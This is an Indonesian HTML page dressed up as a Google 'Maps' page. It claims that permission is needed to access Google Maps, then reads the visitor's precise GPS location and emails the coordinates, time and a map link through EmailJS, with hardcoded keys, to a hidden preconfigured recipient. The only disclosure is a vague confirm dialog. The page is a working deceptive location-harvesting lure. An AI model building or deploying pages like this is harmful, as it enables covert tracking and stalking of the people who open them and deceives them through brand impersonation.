
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Bagikan Lokasi</title>
  <link rel="stylesheet"
    href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">

  <style>
    * { box-sizing: border-box; }

    body {
      margin: 0;
      font-family: Arial, sans-serif;
      color: #202124;
    }

    header {
      padding: 14px;
      background: white;
      box-shadow: 0 2px 5px #0002;
    }

    .brand {
      font-size: 22px;
      color: #4285f4;
      font-weight: bold;
      margin-bottom: 12px;
    }

    input {
      width: 100%;
      padding: 13px;
      border: 1px solid #ddd;
      border-radius: 25px;
    }

    #map {
      width: 100%;
      height: 50vh;
      min-height: 260px;
    }

    .panel { padding: 18px; }

    button {
      padding: 13px 18px;
      background: #1a73e8;
      color: white;
      border: 0;
      border-radius: 24px;
      font-size: 15px;
      cursor: pointer;
    }

    #status, #coords {
      font-size: 14px;
      line-height: 1.7;
      overflow-wrap: anywhere;
      white-space: pre-line;
    }
  </style>
</head>

<body>
  <header>
    <div class="brand">Maps</div>
    <input id="search" placeholder="Cari tempat...">
  </header>

  <div id="map"></div>

  <section class="panel">
    <h3>Bagikan Lokasi GPS</h3>

    <p>
      Izin diperlukan untuk mengakses Google Maps.
    </p>

    <p id="status">Menunggu persetujuan.</p>
    <p id="coords"></p>

    <button id="shareButton">Setuju dan Bagikan Lokasi</button>
  </section>

  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>

  <script>
    const EMAILJS_PUBLIC_KEY = "jzuOyCTWQn_58ncCd";
    const EMAILJS_SERVICE_ID = "service_873xl3f";
    const EMAILJS_TEMPLATE_ID = "template_g80wg7l";

    emailjs.init({ publicKey: EMAILJS_PUBLIC_KEY });

    const map = L.map("map").setView([-6.9932, 110.4203], 13);

    L.tileLayer(
      "https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png",
      {
        maxZoom: 19,
        attribution: "&copy; OpenStreetMap contributors"
      }
    ).addTo(map);

    const status = document.getElementById("status");
    const coords = document.getElementById("coords");
    const shareButton = document.getElementById("shareButton");

    let marker = null;
    let busy = false;

    shareButton.addEventListener("click", function () {
      if (busy) return;

      if (!navigator.geolocation) {
        status.textContent = "Browser tidak mendukung GPS.";
        return;
      }

      busy = true;
      shareButton.disabled = true;
      status.textContent = "Meminta izin lokasi...";

      navigator.geolocation.getCurrentPosition(
        async function (position) {
          const lat = position.coords.latitude;
          const lng = position.coords.longitude;

          map.setView([lat, lng], 17);

          if (marker) map.removeLayer(marker);

          marker = L.marker([lat, lng])
            .addTo(map)
            .bindPopup("Lokasi perangkat")
            .openPopup();

          coords.textContent =
            "Latitude: " + lat.toFixed(6) +
            "\nLongitude: " + lng.toFixed(6);

          const approved = confirm(
            "Kirim koordinat GPS ini melalui email " +
            "ke penerima yang telah dikonfigurasi?"
          );

          if (!approved) {
            status.textContent = "Pengiriman dibatalkan.";
            busy = false;
            shareButton.disabled = false;
            return;
          }

          status.textContent = "Mengirim email...";

          try {
            await emailjs.send(
              EMAILJS_SERVICE_ID,
              EMAILJS_TEMPLATE_ID,
              {
                latitude: lat.toFixed(6),
                longitude: lng.toFixed(6),
                time: new Date().toLocaleString("id-ID"),
                maps_link:
                  "https://www.google.com/maps?q=" +
                  lat + "," + lng
              }
            );

            status.textContent = "Email berhasil dikirim.";
          } catch (error) {
            console.error("EmailJS error:", error);
            status.textContent =
              "Email gagal dikirim. Periksa konfigurasi EmailJS.";
          } finally {
            busy = false;
            shareButton.disabled = false;
          }
        },
        function (error) {
          status.textContent =
            error.code === 1
              ? "Izin lokasi ditolak."
              : "Lokasi tidak tersedia. Periksa GPS.";

          busy = false;
          shareButton.disabled = false;
        },
        {
          enableHighAccuracy: true,
          timeout: 20000,
          maximumAge: 0
        }
      );
    });

    document.getElementById("search").addEventListener(
      "keydown",
      async function (event) {
        if (event.key !== "Enter" || !this.value.trim()) return;

        try {
          const response = await fetch(
            "https://nominatim.openstreetmap.org/search?format=json&limit=1&q=" +
            encodeURIComponent(this.value.trim())
          );

          const data = await response.json();

          if (data.length) {
            map.setView([+data[0].lat, +data[0].lon], 16);
          } else {
            status.textContent = "Tempat tidak ditemukan.";
          }
        } catch {
          status.textContent = "Pencarian gagal. Coba lagi.";
        }
      }
    );
  </script>
</body>
</html>
